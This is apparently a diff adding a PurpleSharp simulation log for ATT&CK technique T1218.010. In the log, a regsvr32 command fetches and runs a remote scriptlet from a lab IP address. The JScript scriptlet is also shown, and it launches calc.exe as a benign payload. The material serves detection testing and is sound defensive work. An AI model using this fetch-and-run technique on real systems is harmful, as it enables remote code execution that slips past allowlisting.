@@ -1,0 +1,24 @@
+c:\Tools\PurpleSharp-master\PurpleSharp\bin\Debug>PurpleSharp.exe /t T1218.010
+11/10/2020 13:04:10 [*]  Starting T1218.010 Simulation on MSEDGEWIN10
+11/10/2020 13:04:10 [*]  Simulator running from c:\Tools\PurpleSharp-master\PurpleSharp\bin\Debug\PurpleSharp.exe with PID:4692 as MSEDGEWIN10\IEUser
+11/10/2020 13:04:10 [*]  Executing Command: regsvr32.exe /u /n /s /i:http://192.168.114.198:8000/back.sct scrobj.dll
+11/10/2020 13:04:10 [*]  Process successfully created. (PID): 5276
+11/10/2020 13:04:10 [*]  Simulation Finished
+11/10/2020 13:04:10 [*]  Playbook Finished
+
+---
+
+$ cat back.sct   
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+  progid="TESTING"
+  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
+  <script language="JScript">
+    <![CDATA[
+      var foo = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
+    ]]>
+</script>
+</registration>
+</scriptlet>
+
